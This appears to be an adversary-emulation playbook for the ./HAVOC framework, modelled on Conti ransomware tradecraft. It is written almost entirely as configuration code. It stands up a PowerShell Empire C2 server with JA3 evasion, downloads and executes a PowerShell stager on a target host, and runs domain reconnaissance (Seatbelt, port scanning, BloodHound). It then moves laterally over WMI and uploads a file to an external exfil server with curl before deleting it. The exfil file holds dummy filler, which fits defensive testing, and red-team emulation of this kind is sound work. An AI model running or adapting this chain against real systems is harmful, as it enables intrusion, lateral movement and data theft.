# Conti Ransomware Playbook

local "function" "now" {
    function_name = "timestamp"
}

local "function" "date_stamp" {
    function_name = "formatdate"
    function_parameters = ["%m_%d_%Y_%H_%M", local.function.now]
}

variable "public_cidr" {
    description = "Public address range. Restrict access to ./HAVOC resources to this IP range."
}

variable "private_cidr" {
    description = "Private address range. Scanning modules will scan this IP range."
}

variable "c2_port" {
    description = "Port number to use for the C2 listener."
    default = "443"
}

variable "http_port" {
    description = "Port number to use for the downloads server's HTTP listener."
    default = "443"
}

variable "exfil_port" {
    description = "Port number to use for the exfil server's HTTP"
    default = "443"
}

variable "exfil_file" {
    description = ""
    default     = "exfil_file.txt"
}

variable "exfil_path" {
    description = ""
    default     = "%USERPROFILE%"
}

variable "exfil_size" {
    description = ""
    default     = "1000"
}

variable "scan_ports" {
    description = ""
    default     = "1-3500"
}

variable "initial_access_task_name" {
    description = ""
    default     = "workstation_host"
}

variable "lateral_movement_task_name" {
    description = ""
    default     = "server_host"
}

data "tasks" "initial_access_task" {
  task_name = variable.initial_access_task_name
}

data "tasks" "lateral_movement_task" {
  task_name = variable.lateral_movement_task_name
}

data "wait_for_c2" "c2_agent" {
    task_name  = resource.task.c2_server.task_name
    depends_on = action.task_execute_command.execute_stager
}

resource "random_string" "random_6" {
  length           = 6
  special          = false
}

resource "random_string" "random_32" {
  length           = 32
  special          = false
}

resource "portgroup" "c2_portgroup" {
    portgroup_name     = "c2_portgroup_${local.function.date_stamp}"
    permitted_cidr     = variable.public_cidr
    permitted_port     = variable.c2_port
    permitted_protocol = "tcp"
}

resource "portgroup" "http_portgroup" {
    portgroup_name     = "http_portgroup_${local.function.date_stamp}"
    permitted_cidr     = variable.public_cidr
    permitted_port     = variable.http_port
    permitted_protocol = "tcp"
}

resource "portgroup" "exfil_portgroup" {
    portgroup_name     = "exfil_portgroup_${local.function.date_stamp}"
    permitted_cidr     = variable.public_cidr
    permitted_port     = variable.exfil_port
    permitted_protocol = "tcp"
}

resource "task" "c2_server" {
    task_type      = "powershell_empire"
    task_name      = "c2_server_${local.function.date_stamp}"
    task_fqdn      = "c2-${resource.random_string.random_6.result}.${variable.domain_name}"
    task_portgroup = resource.portgroup.c2_portgroup.portgroup_name

    listener {
        http_malleable {
            Profile     = "trevor.profile"
            Port        = variable.c2_port
            StagingKey  = resource.random_string.random_32.result
            JA3_Evasion = "True"
        }
    }

    stager {
        Listener   = "http_malleable"
        StagerName = "multi/launcher"
        Language   = "powershell"
        OutFile    = "launcher.ps1"
    }
}

resource "task" "http_server" {
    task_type      = "http_server"
    task_name      = "http_server_${local.function.date_stamp}"
    task_fqdn      = "downloads-${resource.random_string.random_6.result}.${variable.domain_name}"
    task_portgroup = resource.portgroup.http_portgroup.portgroup_name

    listener {
        http {
            Port = variable.http_port
        }
    }
}

resource "task" "exfil_server" {
    task_type      = "exfil_server"
    task_name      = "exfil_server_${local.function.date_stamp}"
    task_fqdn      = "uploads-${resource.random_string.random_6.result}.${variable.domain_name}"
    task_portgroup = resource.portgroup.exfil_portgroup.portgroup_name

    listener {
        http {
            Port = variable.exfil_port
        }
    }
}

resource "file" "stager_upload" {
    file_name     = resource.task.c2_server.stager.OutFile
    file_contents = resource.task.c2_server.stager.Output
}

action "download_from_workspace" "stager_download" {
    task_name = resource.task.http_server.task_name
    file_name = resource.file.stager_upload.file_name
}

action "task_download_file" "download_stager" {
    task_name    = data.tasks.initial_access_task.task_name
    url          = "${resource.task.http_server.url}/${action.download_from_workspace.stager_download.file_name}"
    file_name    = action.download_from_workspace.stager_download.file_name
}

action "task_execute_command" "execute_stager" {
    task_name   = data.tasks.initial_access_task.task_name
    command     = "powershell.exe ${action.task_download_file.download_stager.file_name}"
}

action "agent_execute_module" "antivirusproduct" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/host/antivirusproduct"
    wait_for_results  = true
    completion_string = "completed"
}

action "agent_execute_module" "dnsserver" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/host/dnsserver"
    wait_for_results  = true
    completion_string = "completed"
}

action "agent_execute_module" "get_proxy" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/host/get_proxy"
    wait_for_results  = true
    completion_string = "completed"
}

action "agent_execute_module" "get_uaclevel" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/host/get_uaclevel"
    wait_for_results  = true
    completion_string = "completed"
}

action "agent_execute_module" "seatbelt_user" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/host/seatbelt"
    wait_for_results  = true
    completion_string = "completed"

    module_args = {
        Group = "User"
        Full  = "False"
    }
}

action "agent_execute_module" "seatbelt_system" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/host/seatbelt"
    wait_for_results  = true
    completion_string = "completed"

    module_args = {
        Group = "System"
        Full  = "False"
    }
}

action "agent_execute_module" "reverse_dns" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/network/reverse_dns"
    wait_for_results  = true
    completion_string = "completed"

    module_args = {
        CIDR = variable.private_cidr
    }
}

action "agent_execute_module" "portscan" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/network/portscan"
    wait_for_results  = true
    completion_string = "completed"

    module_args = {
        Hosts = variable.private_cidr
        Ports = variable.scan_ports
    }
}

action "agent_execute_module" "get_domain_controller" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
    wait_for_results  = true
    completion_string = "completed"
}

action "agent_execute_module" "get_domain_policy" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/network/powerview/get_domain_policy"
    wait_for_results  = true
    completion_string = "completed"
}

action "agent_execute_module" "bloodhound" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/situational_awareness/network/bloodhound"
    wait_for_results  = true
    completion_string = "completed"

    module_args = {
        CollectionMethod = "Default"
        Threads          = 20
        Throttle         = 1000
    }
}

action "agent_execute_module" "invoke_wmi" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    module            = "powershell/lateral_movement/invoke_wmi"
    wait_for_results  = true
    completion_string = "completed"

    module_args = {
        ComputerName = data.tasks.lateral_movement_task.host_name
        Listener     = resource.task.c2_server.listener.listener_type
    }
}

action "agent_execute_shell_command" "create_exfil_file" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){\"1234567890qwertyasdfjkl;\"*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
}

action "agent_execute_shell_command" "upload_exfil_file" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} ${resource.task.exfil_server.url}"
    wait_for_results  = true
}

action "agent_execute_shell_command" "delete_exfil_file" {
    task_name         = resource.task.c2_server.task_name
    agent_name        = data.wait_for_c2.c2_agent.agent_name
    command           = "del ${variable.exfil_path}\\${variable.exfil_file}"
    wait_for_results  = true
}